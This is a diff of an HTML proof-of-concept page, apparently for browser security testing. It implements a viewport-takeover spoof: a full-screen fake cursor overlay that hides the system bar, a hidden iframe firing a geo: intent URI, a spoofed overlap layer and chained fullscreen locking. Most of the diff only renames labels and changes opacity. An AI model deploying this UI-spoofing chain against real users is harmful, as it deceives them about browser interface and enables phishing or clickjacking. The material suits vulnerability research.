@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Advanced Fullscreen Fake Cursor & Overlap PoC</title>
+    <title>Ultimate Full-Chain Viewport Takeover PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -69,14 +69,14 @@
         position: absolute;
         opacity: 0;
       }
-      /* Fake Cursor Besar Menutupi Seluruh Layar & Bar */
+      /* Full Viewport Fake Cursor & Layer Coverage */
       #fullscreenFakeCursor {
         position: fixed;
         top: 0;
         left: 0;
         width: 100vw;
         height: 100vh;
-        background: rgba(11, 14, 20, 0.95);
+        background: rgba(11, 14, 20, 0.98);
         border: 4px solid #3fb950;
         box-sizing: border-box;
         z-index: 2147483648;
@@ -96,7 +96,7 @@
         left: 0;
         width: 100vw;
         height: 100vh;
-        background: rgba(11, 14, 20, 0.85);
+        background: rgba(11, 14, 20, 0.9);
         z-index: 2147483646;
         display: none;
         align-items: center;
@@ -122,7 +122,6 @@
       }
     </style>
     <script>
-      // Global Touch Tracking untuk menampilkan Fullscreen Fake Cursor / Overlay Kotak Penuh
       addEventListener("touchstart", (e) => {
         let cursor = document.getElementById("fullscreenFakeCursor");
         if (cursor) {
@@ -133,22 +132,18 @@
       }, { passive: true });
 
       addEventListener("touchend", (e) => {
-        let cursor = document.getElementById("fullscreenFakeCursor");
-        if (cursor) {
-          // Tetap mempertahankan visibilitas penuh sesuai rantai eksekusi
-        }
         let input = document.getElementById("focusInput");
         if (input) input.blur();
       }, { passive: true });
     </script>
   </head>
   <body>
-    <!-- Fullscreen Fake Cursor / Viewport Coverage Layer -->
+    <!-- Full Viewport Coverage Layer -->
     <div id="fullscreenFakeCursor">
       <div>
-        [FULL_VIEWPORT_CURSOR_COVERAGE_ACTIVE]<br><br>
-        System bar and UI suppressed via fake cursor container.<br>
-        Status: Intercepting touch coordinate matrix...
+        [ULTIMATE_FULL_CHAIN_TAKEOVER_ACTIVE]<br><br>
+        All execution vectors chained and locked.<br>
+        Status: Viewport matrix fully intercepted.
       </div>
     </div>
 
@@ -163,12 +158,12 @@
         <div class="overlap-text" id="overlapContent">
           [SECURE_CONTEXT_OVERLAP_ACTIVE]<br>
           Target DOM Selection Overlap initialized successfully.<br>
-          Status: Forcing context focus and viewport takeover...
+          Status: Forcing context focus and deep container locking...
         </div>
       </div>
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE FULL-SCREEN CURSOR CHAIN</button>
+        <button id="execBtn">INITIALIZE ULTIMATE FULL CHAIN</button>
         <div class="info" id="statusInfo">Status: Ready for interaction.</div>
       </div>
     </div>
@@ -178,7 +173,7 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Executing full-screen cursor & chaining sequence...";
+        statusInfo.innerText = "Status: Executing ultimate full-chain sequence...";
         this.style.display = "none";
 
         try {
@@ -190,13 +185,13 @@
             });
           }
 
-          // 2. Intent URI Dispatcher (geo: schema)
+          // 2. Intent URI Dispatcher Chaining
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
           spoofFrame.src = "geo:0,0?q=apple.com";
           document.body.appendChild(spoofFrame);
 
-          // 3. Mengaktifkan Fullscreen Fake Cursor & Selection Overlap Layer
+          // 3. Mengaktifkan Fullscreen Fake Cursor & Selection Overlap Layer secara serentak
           let fullCursor = document.getElementById("fullscreenFakeCursor");
           if (fullCursor) {
             fullCursor.style.display = "flex";
@@ -221,7 +216,7 @@
             spoofImg.style.display = "block";
           }
 
-          statusInfo.innerText = "Status: Full viewport cursor active. Engaging Fullscreen lock...";
+          statusInfo.innerText = "Status: Layers deployed. Engaging full-screen container lock...";
 
           // 5. Aggressive Fullscreen Chaining
           setTimeout(async () => {
@@ -249,7 +244,7 @@
               container.style.display = "none";
             }
             
-            statusInfo.innerText = "Status: Full viewport cursor & chain active.";
+            statusInfo.innerText = "Status: Ultimate full chain active & locked.";
           }, 300);
 
         } catch (err) {
